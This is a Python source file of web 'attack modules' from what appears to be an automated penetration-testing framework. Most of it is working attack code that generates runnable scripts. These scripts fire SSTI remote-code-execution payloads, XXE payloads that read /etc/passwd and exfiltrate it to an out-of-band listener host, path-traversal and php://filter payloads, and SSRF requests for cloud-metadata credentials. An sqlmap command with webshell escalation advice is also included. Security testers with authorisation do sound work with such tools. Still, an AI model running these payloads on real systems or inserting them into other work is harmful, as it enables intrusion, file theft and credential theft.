"""Attack modules: web."""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class SQLInjection(AttackModule):
    name = "SQLInjection"
    description = "Automated SQL injection testing with sqlmap integration"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 8888]
    required_cves = []
    # Capability metadata: advisory info-stub (sqlmap recipe). The module itself
    # does not execute; sqlmap escalation can yield a webshell foothold, but
    # that is a downstream tool outcome, not a module artifact.
    requires: list[str] = []
    produces: list[str] = []
    read_only = True
    cost = "low"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Use sqlmap for comprehensive SQL injection testing. "
                "sqlmap is Linux-attacker only; on Windows use the urllib-based "
                "blind-SQLi probe script. --os-shell / --file-write escalate to "
                "a webshell foothold."
            ),
            evidence=[f"SQLi testing planned against {ctx.target_ip}"],
            references=[
                "https://sqlmap.org",
                "https://owasp.org/www-community/attacks/SQL_Injection",
            ],
            suggested_command=(
                f"sqlmap -u 'http://{ctx.target_ip}/page.php?id=1' --batch --crawl=2 --forms --level=3 --risk=2"
            ),
            techniques=["union", "error", "time", "stacked"],
        )


class SSTIProbe(AttackModule):
    name = "SSTIProbe"
    description = "Server-Side Template Injection detection and exploitation (Jinja2, Twig, Freemarker, Velocity)"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: SSTI detection; a confirmed SSTI escalates to RCE
    # via the inline RCE probe payloads (shell), but the module surfaces the
    # finding rather than declaring a foothold.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Probes for SSTI across Jinja2, Twig, Freemarker, Velocity, Smarty, and Mako engines.",
            "evidence": [f"SSTI probes queued against {ctx.target_ip}"],
            "references": [
                "https://portswigger.net/web-security/server-side-template-injection",
                "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""SSTI Probe — detect and fingerprint template injection across engines."""
import sys, urllib.request, urllib.parse, urllib.error, re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

# Polyglot payloads that trigger different engines
MATH_PAYLOADS = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${{7*7}}", "49", "Freemarker"),
    ("#{{7*7}}", "49", "Velocity"),
    ("{{=7*7}}", "49", "Mako"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("<% out.println(7*7); %>", "49", "JSP/EL"),
]

# RCE test payloads (only after confirming SSTI)
RCE_PAYLOADS = [
    ("Jinja2", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
    ("Jinja2", "{{''.__class__.__mro__[1].__subclasses__()}}"),
    ("Twig", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"),
    ("Freemarker", "<#assign ex='freemarker.template.utility.Execute'?new()> ${{ex('id')}}"),
    ("Velocity", "#set($x='')$x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')"),
    ("Smarty", "{{system('id')}}"),
]

def test_endpoint(url: str, param_name: str = "q"):
    """Test a single endpoint for SSTI."""
    print(f"\\nTesting: {{url}}")
    for payload, expected, engine in MATH_PAYLOADS:
        try:
            test_url = f"{{url}}?{{param_name}}={{urllib.parse.quote(payload)}}"
            req = urllib.request.Request(test_url)
            with urllib.request.urlopen(req, timeout=8) as resp:
                body = resp.read(8192).decode(errors="replace")
                if expected in body:
                    print(f"  [SSTI DETECTED] {{engine}} — payload '{{payload}}' reflected with {{expected}}")
                    return engine
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="replace")
            if expected in body:
                print(f"  [SSTI DETECTED] {{engine}} — payload '{{payload}}' reflected in error {{e.code}}")
                return engine
        except Exception:
            pass
    return None

# Test common endpoints
endpoints = ["/", "/search", "/profile", "/user", "/page", "/render", "/preview", "/template"]
params = ["q", "search", "name", "username", "id", "page", "input", "data", "template"]

found_engine = None
for ep in endpoints:
    for param in params:
        engine = test_endpoint(f"{{BASE}}{{ep}}", param)
        if engine:
            found_engine = engine
            break
    if found_engine:
        break

if found_engine:
    print(f"\\n[+] Confirmed SSTI in {{found_engine}}. Attempting RCE probes...")
    for engine_name, rce_payload in RCE_PAYLOADS:
        if engine_name == found_engine:
            try:
                test_url = f"{{BASE}}/?q={{urllib.parse.quote(rce_payload)}}"
                req = urllib.request.Request(test_url)
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read(8192).decode(errors="replace")
                    print(f"  RCE probe sent: {{rce_payload[:60]}}...")
                    print(f"  Response: {{body[:500]}}")
            except Exception as e:
                print(f"  RCE probe error: {{e}}")
else:
    print("\\n[-] No SSTI detected on common endpoints.")
'''


class XXEProbe(AttackModule):
    name = "XXEProbe"
    description = "XML External Entity injection detection — in-band file read via file:// and OOB entity exfiltration against XML-accepting endpoints"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: XXE file-read/exfil detection; surfaces a finding
    # (file content / OOB callback), not a durable foothold artifact.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "POSTs in-band (file:// /etc/passwd) and OOB external-entity XML payloads to XML-accepting endpoints on ctx.target_ip. Set the OOB listener host before running the OOB variant.",
            "evidence": [f"XXE probes queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Processing",
                "https://portswigger.net/web-security/xxe",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""XXE Probe — in-band and OOB external entity injection against the target."""
import sys, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

# Operator sets this to their own OOB listener host (e.g. attacker.example or
# the operator-box callback IP). Default placeholder is a non-resolving name so
# the OOB probe is safe to run without a listener; entities will still be
# parsed by the target, producing detectable errors/timeouts.
OOB_HOST = "xxe-listener.operator.example"
OOB_PORT = 8888

ENDPOINTS = ["/", "/api/xml", "/import", "/upload", "/soap"]

# (a) In-band external entity reading /etc/passwd via file://
INBAND_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>\\n'
    '<!DOCTYPE foo [\\n'
    '  <!ELEMENT foo ANY>\\n'
    '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\\n'
    ']>\\n'
    '<foo>&xxe;</foo>\\n'
)

# (b) OOB external entity — parameter entity pulls from attacker-controlled URL.
# The target resolves OOB_HOST and tries to fetch from it; exfiltration happens
# via the parameter entity referencing the attacker URL. The operator must run
# an OOB listener (e.g. Burp Collaborator, responder) and set OOB_HOST.
OOB_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>\\n'
    '<!DOCTYPE foo [\\n'
    '  <!ELEMENT foo ANY>\\n'
    '  <!ENTITY % ext SYSTEM "http://{{OOB_HOST}}:{{OOB_PORT}}/xxe.dtd">\\n'
    '  %ext;\\n'
    ']>\\n'
    '<foo>xxe-oob-probe</foo>\\n'
)

# Optional: a secondary OOB payload that exfiltrates /etc/passwd via a
# parameter-entity-defined entity routed to the attacker listener.
OOB_EXFIL_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>\\n'
    '<!DOCTYPE foo [\\n'
    '  <!ENTITY % file SYSTEM "file:///etc/passwd">\\n'
    '  <!ENTITY % dtd SYSTEM "http://{{OOB_HOST}}:{{OOB_PORT}}/exfil.dtd">\\n'
    '  %dtd;\\n'
    ']>\\n'
    '<foo>xxe-oob-exfil-probe</foo>\\n'
)

ENTITY_MARKERS = ["DOCTYPE", "entity", "root:", "/bin/", "bin/bash", "XMLError",
                  "EntityRef", "external entity", "FAILED to load external"]

def post_xml(url: str, body: str, content_type: str) -> str:
    data = body.encode()
    try:
        req = urllib.request.Request(url, data=data, headers={{"Content-Type": content_type}}, method="POST")
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.read(8192).decode(errors="replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(8192).decode(errors="replace")
        except Exception:
            return ""
    except Exception as e:
        return f"<err:{{e}}>"

print(f"=== XXE Probe: {{BASE}} ===\\n")

print("[1] In-band file:// /etc/passwd probe (application/xml)...")
inband_hits = 0
for ep in ENDPOINTS:
    body = post_xml(f"{{BASE}}{{ep}}", INBAND_XML, "application/xml")
    if not body:
        continue
    for marker in ENTITY_MARKERS:
        if marker.lower() in body.lower():
            print(f"  [+] HIT {{ep}} (application/xml): marker '{{marker}}'")
            print(f"      snippet: {{body[:300]!r}}")
            inband_hits += 1
            break
    if "root:" in body:
        print(f"  [+] /etc/passwd content reflected at {{ep}} — in-band XXE CONFIRMED")
        inband_hits += 1

print("\\n[2] In-band probe (text/xml)...")
for ep in ENDPOINTS:
    body = post_xml(f"{{BASE}}{{ep}}", INBAND_XML, "text/xml")
    if body and ("root:" in body or "bin/bash" in body):
        print(f"  [+] HIT {{ep}} (text/xml): /etc/passwd content reflected")
        inband_hits += 1

print("\\n[3] OOB external-entity probe (operator must set OOB_HOST listener)...")
print(f"    OOB listener configured as: http://{{OOB_HOST}}:{{OOB_PORT}}")
oob_hits = 0
for ep in ENDPOINTS:
    body = post_xml(f"{{BASE}}{{ep}}", OOB_XML, "application/xml")
    if body:
        for marker in ENTITY_MARKERS:
            if marker.lower() in body.lower():
                print(f"  [?] {{ep}}: entity-parsing marker '{{marker}}' (check OOB listener for callback)")
                oob_hits += 1
                break

print("\\n[4] OOB exfil probe (parameter entity + external DTD)...")
for ep in ENDPOINTS:
    body = post_xml(f"{{BASE}}{{ep}}", OOB_EXFIL_XML, "application/xml")
    if body and ("DOCTYPE" in body or "entity" in body.lower()):
        print(f"  [?] {{ep}}: OOB exfil payload accepted — check listener for /etc/passwd callback")
        oob_hits += 1

total = inband_hits + oob_hits
if total == 0:
    print("\\n[-] No XXE indicators found.")
else:
    print(f"\\n[!] {{total}} XXE indicator(s). In-band hits confirm file read; OOB hits require listener callback to confirm exfil.")
'''


class LFITraversal(AttackModule):
    name = "LFITraversal"
    description = "Local File Inclusion / path traversal detection — inject traversal and php://filter payloads into file/include parameters and detect /etc/passwd content"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: LFI/traversal detection; surfaces a file-read
    # finding, escalates to RCE via log poisoning / wrappers downstream.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Injects ../, ....//, %2f, absolute-path, and php://filter traversal payloads into file/include params on ctx.target_ip. Flags responses containing /etc/passwd content or base64-looking output.",
            "evidence": [f"LFI/traversal probes queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/Path_Traversal",
                "https://portswigger.net/web-security/file-path-traversal",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""LFI / Path Traversal Probe — inject traversal payloads into file parameters on the target."""
import sys, re, urllib.request, urllib.parse, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

# Common file/include-style parameters
PARAMS = ["file", "page", "path", "include", "template", "doc", "image", "cat", "content"]
# Endpoints that commonly map a parameter to a filesystem path
ENDPOINTS = ["/", "/index.php", "/page", "/view", "/include", "/download"]

# Traversal payloads targeting /etc/passwd on the target's own filesystem.
# These traverse the TARGET's filesystem, not any third-party host.
PAYLOADS = [
    "../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
    "....\\\\....\\\\....\\\\etc/passwd",
    "file:///etc/passwd",
]

# Markers that indicate the target read /etc/passwd
PASSWD_MARKERS = ["root:", "bin/bash", "bin/sh", "/sbin/nologin", "daemon:"]
# Base64-looking content (php://filter base64 output) — long base64 blob
B64_RE = re.compile(r"[A-Za-z0-9+/]{{40,}}={{0,2}}")

def fetch(url: str) -> str:
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.read(16384).decode(errors="replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(16384).decode(errors="replace")
        except Exception:
            return ""
    except Exception:
        return ""

print(f"=== LFI / Traversal Probe: {{BASE}} ===\\n")

hits = 0
for ep in ENDPOINTS:
    for param in PARAMS:
        for payload in PAYLOADS:
            full = f"{{BASE}}{{ep}}?{{param}}={{urllib.parse.quote(payload, safe='')}}"
            body = fetch(full)
            if not body:
                continue
            matched = None
            for marker in PASSWD_MARKERS:
                if marker in body:
                    matched = marker
                    break
            b64_match = B64_RE.search(body) if "base64" in payload else None
            if matched:
                print(f"[+] LFI HIT: {{ep}}?{{param}}= -> marker '{{matched}}'")
                print(f"    payload: {{payload}}")
                print(f"    snippet: {{body[:300]!r}}")
                hits += 1
            elif b64_match:
                print(f"[+] LFI HIT (b64): {{ep}}?{{param}}= -> base64 blob (php://filter output)")
                print(f"    payload: {{payload}}")
                print(f"    blob: {{b64_match.group(0)[:120]}}...")
                hits += 1

if hits == 0:
    print("[-] No LFI/traversal indicators found on common endpoints/params.")
else:
    print(f"\\n[!] {{hits}} LFI indicator(s). Decode any base64 blobs; escalate to log poisoning or RCE via wrappers (php://input, expect://).")

print("\\n[!] Traversal targets the ctx.target_ip host filesystem only — no third-party pivot.")
'''


# ---------------------------------------------------------------------------
# Credential Attack Amplifier Modules
# ---------------------------------------------------------------------------


class SSRFProbe(AttackModule):
    name = "SSRFProbe"
    description = "Server-Side Request Forgery detection — inject internal-URL payloads into fetch/proxy parameters and detect reflected internal content (cloud metadata, loopback services)"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: SSRF detection; metadata-cred exfiltration is a
    # downstream step, the probe itself surfaces a finding.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Injects internal-target URLs (loopback, link-local metadata, internal service ports) into fetch/proxy params on ctx.target_ip. The target is asked to fetch — no third-party pivot.",
            "evidence": [f"SSRF probes queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                "https://portswigger.net/web-security/ssrf",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""SSRF Probe — inject internal-URL payloads into fetch/proxy parameters on the target."""
import sys, urllib.request, urllib.parse, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

# Candidate URL-fetch parameters observed in real SSRF sinks
PARAMS = ["url", "target", "next", "dest", "redirect", "image", "fetch", "file", "path", "uri"]
# Common endpoints that accept a URL/fetch parameter
ENDPOINTS = ["/", "/fetch", "/proxy", "/api/fetch", "/load", "/preview", "/pdf", "/import"]

# Internal payloads — these are fetched BY the target (ctx.target_ip), not by us.
# 169.254.169.254 is the cloud metadata endpoint internal to the target's cloud
# environment; the probe asks the target to fetch it, which is SSRF against the
# target itself, not a pivot to a third-party host.
PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost:6379/",
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80/",
    "http://[::1]/",
]

# Markers that indicate the target fetched an internal resource
INTERNAL_MARKERS = ["ami-", "instance-id", "redis", "instance-type",
                    "security-credentials", "i-am", "RESQUE", "PONG",
                    "+PONG", "redis_version", "WALLOPS"]

def probe(url: str) -> str:
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.read(8192).decode(errors="replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(8192).decode(errors="replace")
        except Exception:
            return ""
    except Exception:
        return ""

print(f"=== SSRF Probe: {{BASE}} ===\\n")

hits = 0
for ep in ENDPOINTS:
    for param in PARAMS:
        for payload in PAYLOADS:
            full = f"{{BASE}}{{ep}}?{{param}}={{urllib.parse.quote(payload, safe='')}}"
            body = probe(full)
            if not body:
                continue
            for marker in INTERNAL_MARKERS:
                if marker.lower() in body.lower():
                    print(f"[+] SSRF HIT: {{ep}}?{{param}}=... -> marker '{{marker}}' in response")
                    print(f"    payload: {{payload}}")
                    print(f"    snippet: {{body[:200]!r}}")
                    hits += 1
                    break
            # Also flag direct reflection of the payload URL in the body
            if payload in body:
                print(f"[?] REFLECTION: {{ep}}?{{param}}= reflected payload {{payload}}")
                hits += 1

if hits == 0:
    print("[-] No SSRF indicators found on common endpoints/params.")
else:
    print(f"\\n[!] {{hits}} SSRF indicator(s) found. Confirm manually and escalate to RCE via metadata creds or internal services.")

print("\\n[!] Cloud metadata (169.254.169.254) is fetched BY the target — this probes the target's own cloud env, not a third-party host.")
'''
